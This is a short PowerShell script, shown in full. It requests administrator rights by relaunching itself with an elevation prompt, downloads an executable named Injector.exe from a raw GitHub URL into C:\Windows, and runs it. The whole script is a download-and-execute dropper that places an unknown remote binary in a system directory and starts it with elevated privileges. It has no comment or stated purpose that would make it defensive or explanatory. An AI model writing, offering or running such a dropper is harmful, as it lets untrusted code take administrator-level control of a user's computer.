$adminCheck = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$adminRole = [System.Security.Principal.WindowsPrincipal]::new($adminCheck)
if (-not $adminRole.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$url = "https://raw.githubusercontent.com/11co/-/main/Injector.exe"
$filename = "Injector.exe"
$systemPath = "C:\Windows\$filename"

Invoke-WebRequest -Uri $url -OutFile $systemPath

Start-Process -FilePath $systemPath